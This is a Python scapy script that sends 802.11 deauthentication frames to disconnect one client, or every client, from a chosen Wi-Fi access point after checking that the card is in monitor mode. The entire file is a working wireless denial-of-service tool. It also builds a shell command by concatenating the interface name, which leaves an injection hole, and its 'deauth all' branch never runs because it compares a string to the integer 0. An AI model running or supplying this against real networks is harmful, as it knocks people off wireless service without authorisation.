from scapy.all import *
import subprocess
import re

def deauth_packet(src_mac , iface,n , dest_mac="ff:ff:ff:ff:ff:ff"):
    dot11 = Dot11(addr1=dest_mac ,addr2=src_mac , addr3=src_mac )

    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet,inter=0.1,count=n,iface=iface)

def is_monitor_mode(iface):
    try:
        s = subprocess.check_output("iwconfig "+ iface,shell=True , text=True)
        k = re.search("(Mode:)(.*?\s)", s)
        if k[2].strip(" ") != "Monitor":
            print("put your card in monitor mode and continue")
            exit(0)
    except:
        print("enter the correct interface which can support monitor mode")

def start(iface):
    dest_mac = input("ENTER THE CLIENT MAC OR PRESS 0 TO DEAUTH ALL CLIENTS FROM AP : ")
    src_mac = input("enter the mac address of the access point : ")
    is_monitor_mode(iface)
    n = int(input("enter the no of deauth packets :"))
    try:
        if dest_mac !=0 :
            deauth_packet(src_mac,iface,n,dest_mac)
        else:
            deauth_packet(src_mac,iface,n)
    except:
        print("SOMETHING WENT WRONG ...\.\.\TRY TO ENTER A VALID MAC ADDRESS")